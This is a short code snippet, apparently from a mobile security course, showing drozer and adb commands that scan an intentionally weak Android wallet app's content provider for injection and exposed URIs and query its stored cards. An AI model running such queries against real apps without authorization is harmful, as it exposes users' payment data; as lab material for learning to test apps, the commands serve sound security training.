<pre><code>dz&gt; run scanner.provider.injection -a com.elearnsecurity.weakwallet\ndz&gt; run scanner.provider.finduris -a com.elearnsecurity.weakwallet\ndz &gt; run app.provider.query content://com.elearnsecurity.provider.Wallet/cards\n\n\nadb shell content query --uri content://com.elearnsecurity.provider.Wallet/cards/\n</code></pre></p>"}]}